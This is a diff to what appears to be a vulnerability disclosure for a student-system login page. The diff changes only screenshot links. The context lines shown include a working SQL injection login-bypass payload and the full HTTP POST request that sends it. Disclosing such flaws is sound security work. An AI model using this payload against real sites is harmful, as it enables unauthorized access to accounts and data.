@@ -19,13 +19,13 @@ The reason for the SQL injection vulnerability is that the website application d
 
 1. Open login.php source code.
 
-![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/c1bca541-54db-4027-a702-587f0411e638)
+![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/b1172a22-8865-4368-b436-9b369edee757)
 
 2. POST SQL injection payload  (`user='or '1'='1' limit 1#&pass='or '1'='1' limit 1#&submit=%E6%8F%90%E4%BA%A4`) 
 
 3. Html Request Code
 
-![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/e9ed2a4d-d954-4629-8e28-d2eb61825a6c)
+![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/094278d5-3144-4cb2-bb34-dee6f934025e)
 ```
 POST /student/login.php HTTP/1.1
 Host: 172.24.6.107:8081
@@ -48,6 +48,6 @@ user='or '1'='1' limit 1#&pass='or '1'='1' limit 1#&submit=%E6%8F%90%E4%BA%A4
 
 4. response
 
-![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/4b36022d-4b2d-4b6c-8009-b20a2ead925e)
-![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/16863421-0a3c-4bef-a505-fa1cd8a9e7fa)
+![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/7b977528-8ee2-492e-850a-3f88b26917cf)
+![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/72730c85-66cc-49a3-a963-6669a24eb9c8)
 
